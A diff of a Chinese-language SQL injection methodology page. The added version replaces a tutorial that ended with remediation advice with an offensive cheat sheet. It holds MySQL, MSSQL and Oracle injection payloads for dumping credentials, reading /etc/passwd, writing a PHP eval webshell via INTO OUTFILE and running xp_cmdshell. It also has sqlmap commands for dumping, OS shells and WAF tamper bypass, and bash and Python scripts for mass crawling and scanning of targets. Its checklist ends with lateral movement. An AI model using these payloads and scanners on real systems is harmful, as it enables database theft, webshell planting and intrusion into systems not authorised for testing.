@@ -1,157 +1,261 @@
-# SQL 注入漏洞挖掘全流程（手工 + sqlmap + 绕过）
+# SQL注入漏洞挖掘实战方法论
 
-## 1. 漏洞概述
+> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：漏洞库与EXP
 
-SQL 注入（SQL Injection）是指攻击者通过控制用户可控参数，将恶意 SQL 语句"拼接"进应用原本的 SQL 查询中，使数据库执行非预期命令，从而造成数据泄露、篡改、删除，甚至命令执行的高危漏洞。SQL 注入长期位列 OWASP Top 10 首位，在真实环境的 Web 资产中仍然非常常见。
+## 📋 提纲
 
-| 项目 | 说明 |
-|------|------|
-| 漏洞类型 | SQL 注入 / 代码注入 |
-| 影响 | 数据泄露、篡改、删除、提权、RCE |
-| 常见注入场景 | 搜索框、分页 id、筛选条件、登录表单、排序参数 |
-| 推荐工具 | Burp Suite、sqlmap、Hackbar、NoSQLMap |
-| 关键判断依据 | 参数变化导致返回内容差异 / 延迟 / 报错 |
+1. SQL注入类型全景
+2. 手工注入速查
+3. 自动化挖掘（SQLMap）
+4. 绕过技巧
+5. 护网中SQL注入挖掘
 
-## 2. 注入点识别与手工判断
+---
 
-### 2.1 常见注入点位置
+## 1. SQL注入类型全景
 
-- URL 查询参数：`?id=1`、`?page=1&cat=3`
-- POST 表单字段：用户名、搜索关键词、任意对象 ID
-- Cookie / User-Agent / X-Forwarded-For 等 Header
-- JSON / XML Body 中的字段（尤其是 `id`、`uid`、`type`）
-- REST 路径参数：`/api/users/123`
+| 类型 | 特征 | 利用难度 |
+|------|------|---------|
+| 联合查询注入 | 有回显，直接UNION SELECT | ⭐ |
+| 报错注入 | 无回显但有报错信息 | ⭐⭐ |
+| 布尔盲注 | 无回显，用响应差异判断 | ⭐⭐⭐ |
+| 时间盲注 | 无任何回显，用延迟判断 | ⭐⭐⭐ |
+| 堆叠注入 | 可执行多条SQL | ⭐ |
+| 二次注入 | 数据先存储后被调用 | ⭐⭐⭐⭐ |
+| DNS外带注入 | 利用DNS请求外传数据 | ⭐⭐ |
+| 宽字节注入 | GBK编码下%df吃掉反斜杠 | ⭐⭐ |
 
-### 2.2 手工初步判断
+---
 
-对每个疑似参数，依次构造以下 payload 观察响应差异：
+## 2. 手工注入速查
 
+### 2.1 MySQL 速查
+
+```sql
+-- 判断注入点
+' AND 1=1-- (正常)
+' AND 1=2-- (异常 → 注入点确认)
+
+-- 判断列数
+' ORDER BY 3-- (正常)
+' ORDER BY 4-- (异常 → 3列)
+
+-- 联合查询
+' UNION SELECT 1,2,3--
+
+-- 获取数据库名
+' UNION SELECT 1,database(),3--
+
+-- 获取表名
+' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
+
+-- 获取列名
+' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
+
+-- 获取数据
+' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
+
+-- 报错注入
+' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
+' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--
+
+-- 时间盲注
+' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)--
+
+-- 读写文件
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
+' UNION SELECT 1,2,'<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--
 ```
-1'              // 单引号，观察是否引发 SQL 语法报错
-1"              // 双引号
-1 and 1=1       // 正常条件
-1 and 1=2       // 恒假条件（布尔注入判断）
-1' or '1'='1    // 绕过登录 / 逻辑 or 注入
-1 order by 5--  // 判断列数
+
+### 2.2 MSSQL 速查
+
+```sql
+-- 判断数据库
+' AND @@version=1--
+
+-- 获取表名
+' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
+
+-- 获取列名
+' UNION SELECT 1,name,3 FROM syscolumns WHERE id=OBJECT_ID('users')--
+
+-- 堆叠注入
+'; EXEC xp_cmdshell('whoami')--
+
+-- 开启xp_cmdshell
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
+
+-- 报错注入
+' AND 1=CONVERT(int,(SELECT @@version))--
 ```
 
-### 2.3 闭合方式推断
+### 2.3 Oracle 速查
 
-根据报错与页面返回结果判断后端拼接方式：
+```sql
+-- 获取表名
+' UNION SELECT table_name,NULL FROM all_tables--
 
-| 响应现象 | 推测闭合方式 |
-|---------|-------------|
-| 返回 You have an error in your SQL syntax（MySQL） | 单引号字符串 `'$id'` |
-| 返回未闭合的括号 | `WHERE id = ($id)` |
-| 数字型参数 `and 1=2` 生效 | 直接数值 `WHERE id = $id` |
-| 无报错但页面变化但不回显数据 | 盲注场景，使用布尔 / 时间判断 |
+-- 获取列名  
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
 
-### 2.4 数据库类型识别
+-- 报错注入
+' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version))--
 
-不同数据库使用不同函数与关键字，可作为识别依据：
-
-```
-MySQL：    VERSION() / @@version / information_schema
-MSSQL：    @@VERSION / xp_cmdshell / sysobjects
-Oracle：   SELECT banner FROM v$version / utl_http.request
-PostgreSQL：version() / pg_sleep()
-Access：   TOP / MID / NOW()
-SQLite：   sqlite_version() / sqlite_master
+-- 时间盲注（Oracle无SLEEP）
+' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1 END FROM dual) IS NOT NULL--
 ```
 
-## 3. sqlmap 自动化利用
+---
 
-### 3.1 基本用法
+## 3. SQLMap 自动化
+
+### 3.1 常用命令
 
 ```bash
-# 最常用：对单一 URL 进行检测
-sqlmap -u "http://target/news.php?id=1" --batch
+# 基础扫描
+sqlmap -u "http://target.com/page.php?id=1" --batch
 
-# 指定数据库类型可加速
-sqlmap -u "http://target/news.php?id=1" --dbms=mysql --batch
+# 指定数据库
+sqlmap -u "http://target.com/page.php?id=1" --dbs
 
-# POST 请求：将 request 保存在 req.txt 中，然后使用
-sqlmap -r req.txt --batch
+# 获取表
+sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
 
-# 通过 Burp 流量文件直接扫描
-sqlmap -l burp.log --batch --skip-heuristic
+# 获取列
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns
+
+# 获取数据
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
+
+# 从文件读请求
+sqlmap -r request.txt --batch
+
+# 高等级扫描（更多探测payload）
+sqlmap -r request.txt --level=5 --risk=3
+
+# 使用代理（看流量）
+sqlmap -r request.txt --proxy=http://127.0.0.1:8080
+
+# 指定注入技术
+sqlmap -r request.txt --technique=U  # 只用UNION
+sqlmap -r request.txt --technique=B  # 只用Boolean盲注
+sqlmap -r request.txt --technique=T  # 只用Time盲注
+
+# Tamper脚本（绕过WAF）
+sqlmap -r request.txt --tamper=space2comment,randomcase,between
+
+# OS Shell
+sqlmap -r request.txt --os-shell
+
+# 文件读取
+sqlmap -r request.txt --file-read="/etc/passwd"
 ```
 
-### 3.2 常见参数速查
-
-| 参数 | 作用 |
-|------|------|
-| `--dbs` | 枚举数据库名 |
-| `--tables` | 枚举表名 |
-| `-D dbname --columns` | 枚举指定库的字段 |
-| `-D db -T tb -C "id,user,pass" --dump` | 导出数据 |
-| `--users` / `--passwords` | 枚举数据库用户与哈希 |
-| `--is-dba` | 判断当前是否为 DBA |
-| `--os-shell` | 获取系统交互 shell（MSSQL/MySQL 文件权限场景） |
-| `--batch --random-agent` | 自动选择默认选项 + 随机 UA |
-| `--tamper=space2comment` | 使用 tamper 脚本绕过过滤 |
-
-### 3.3 一个完整的实战流程示例
+### 3.2 Tamper 脚本组合
 
 ```bash
-# 步骤 1：检测注入
-sqlmap -u "http://target/item.php?id=1" --batch
+# WAF绕过 Tamper 组合
+sqlmap -u "http://target.com?id=1" --tamper="space2comment,between,randomcase,charencode,charunicodeencode" --batch
 
-# 步骤 2：枚举数据库
-sqlmap -u "http://target/item.php?id=1" --dbs --batch
-
-# 步骤 3：枚举指定数据库的表
-sqlmap -u "http://target/item.php?id=1" -D cms --tables --batch
-
-# 步骤 4：导出管理员账号表
-sqlmap -u "http://target/item.php?id=1" -D cms -T admin -C "id,username,password" --dump --batch
+# 常用 tamper:
+# space2comment:   空格→/**/
+# between:          = → BETWEEN
+# randomcase:       随机大小写
+# charencode:       字符URL编码
+# percentage:       每个字符后加%
+# bluecoat:         %00
+# versionedmorekeywords: MySQL版本号注释绕过
 ```
 
-## 4. WAF / 过滤绕过技巧
+---
 
-### 4.1 关键字过滤绕过
+## 4. 护网中SQL注入挖掘
 
-```
-# 空格过滤：使用注释符 /*...*/ / Tab / 括号
-?id=1'/*foo*/and/*bar*/1=1-- -
-
-# and / or 过滤：使用 && / ||
-?id=1 && 1=1
-
-# union select 过滤：使用 union all select / 内联注释
-?id=-1/*!50000union*//*!select*/1,2,3-- -
-
-# select 过滤：改使用大小写或双写
-?id=1' unIon sElEct 1,2,3-- -
-
-# 引号过滤：十六进制 / char() 函数
-?id=1 union select 0x61646d696e,2,3-- -
-```
-
-### 4.2 常用 sqlmap tamper 脚本
+### 4.1 批量检测
 
 ```bash
-# 绕过分块上传 / 简单正则
-sqlmap -u URL --tamper=space2comment --batch
+#!/bin/bash
+# 从Burp Sitemap提取所有GET参数 → 批量SQLMap
 
-# 绕过关键字替换（双写）
-sqlmap -u URL --tamper=doubleselect --batch
+# 1. Burp导出URL列表
+# 2. 提取含参数的URL
+grep -E '\?' urls.txt | sort -u > urls_with_params.txt
 
-# 同时使用多个 tamper
-sqlmap -u URL --tamper=apostrophemask,space2comment,between --batch
+# 3. 批量SQLMap（轻量级）
+while IFS= read -r url; do
+    echo "检测: $url"
+    sqlmap -u "$url" --batch --level=1 --risk=1 --smart --threads=5 --timeout=10 2>/dev/null |
+        grep -E "parameter.*vulnerable|CRITICAL" &&
+        echo "⚠️ $url" >> sqli_found.txt
+done < urls_with_params.txt
 ```
 
-### 4.3 HTTP 层面绕过
+### 4.2 URL采集脚本
 
-- 分片传输（chunked transfer-encoding），让 WAF 难以重组包体
-- HTTP 参数污染（HPP）：同时提交多个同名参数，利用后端解析差异
-- 使用 `Content-Type: multipart/form-data` 或 JSON 格式绕过规则匹配
-- 更换请求方法：把 GET 的 payload 搬到 POST body
+```python
+#!/usr/bin/env python3
+"""从Web页面自动提取所有含参数的URL"""
 
-## 5. 修复建议
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin, urlparse, parse_qs
 
-1. **参数化查询 / 预编译语句**（首选）：Java `PreparedStatement`、Python `psycopg2` 参数绑定、PHP PDO。
-2. **严格类型校验**：数字型参数先转 int，再拼入 SQL。
-3. **白名单校验**：排序、表名等只能来自白名单字符串。
-4. **最小权限原则**：Web 连接数据库的账号不应具备 `FILE`、`SUPER` 等高权限。
-5. **部署 WAF**：在边界部署规则严格的 WAF，作为补充防线。
+def extract_urls_with_params(target, max_depth=2):
+    visited = set()
+    urls_with_params = set()
+
+    def crawl(url, depth):
+        if depth > max_depth or url in visited:
+            return
+        visited.add(url)
+
+        try:
+            resp = requests.get(url, timeout=10, verify=False)
+
+            # 记录当前URL（如果有参数）
+            if '?' in url:
+                urls_with_params.add(url)
+
+            # 提取页面中的链接和form
+            soup = BeautifulSoup(resp.text, 'html.parser')
+
+            # 所有链接
+            for link in soup.find_all('a', href=True):
+                full_url = urljoin(url, link['href'])
+                if target in full_url:
+                    crawl(full_url, depth + 1)
+
+            # 所有form的action
+            for form in soup.find_all('form', action=True):
+                action = urljoin(url, form['action'])
+                # 提取form的input参数
+                inputs = [inp.get('name','') for inp in form.find_all(['input','select','textarea']) if inp.get('name')]
+                if inputs:
+                    param_url = f"{action}?{'&'.join(f'{i}=1' for i in inputs)}"
+                    urls_with_params.add(param_url)
+
+        except:
+            pass
+
+    crawl(target, 0)
+    return urls_with_params
+
+# 使用
+urls = extract_urls_with_params('https://target.com')
+with open('urls_with_params.txt', 'w') as f:
+    for url in urls:
+        f.write(url + '\n')
+```
+
+---
+
+## ✅ SQL注入挖掘 Checklist
+
+- [ ] 所有GET/POST参数枚举
+- [ ] Cookie/Header/JSON参数测试
+- [ ] 五种注入类型测试
+- [ ] SQLMap批量扫描
+- [ ] WAF绕过Tamper组合
+- [ ] 注入成功→数据获取→横向移动
+
+> 📚 延伸阅读：Penetration/003-SQL注入 | Penetration/007-WAF绕过 | Vuln/001-漏洞概述
